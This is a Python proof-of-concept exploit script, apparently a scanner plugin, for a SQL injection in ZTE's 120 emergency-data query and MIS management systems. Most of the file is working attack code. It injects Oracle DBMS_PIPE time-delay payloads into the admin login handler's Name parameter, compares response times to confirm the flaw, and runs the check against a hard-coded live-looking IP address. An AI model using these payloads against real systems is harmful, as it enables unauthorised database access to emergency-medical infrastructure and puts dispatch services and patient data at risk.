#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  中兴120数据查询统计系统 and 中兴120-MIS急救信息管理系统 通用 SQL注入 
Author    :  a
mail      :  a@lcx.cc
 
"""
import urlparse
import time

def assign(service, arg):
    if service == 'zte':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    start_time1=time.time()
    payload1 = "Handler/AdminLogin.ashx?Name=admin'%20AND%204591=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(90)||CHR(68)||CHR(100),0)%20AND%20'UZDe'='UZDe&Pwd=admin&now=1450883581659"
    url1 = arg + payload1
    code1, head, res, errcode, _ = curl.curl2(url1)
    true_time=time.time()-start_time1
    start_time2=time.time()
    payload2 = "Handler/AdminLogin.ashx?Name=admin'%20AND%204591=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(90)||CHR(68)||CHR(100),5)%20AND%20'UZDe'='UZDe&Pwd=admin&now=1450883581659"
    url2 = arg + payload2
    code2, head, res, errcode, _ = curl.curl2(url2)
    flase_time=time.time()-start_time2
    if code1==200 and code2==200 and flase_time>5>true_time:
        security_hole(url2)

if __name__ == '__main__':
    from dummy import *
    audit(assign('zte', 'http://222.69.158.122/')[1])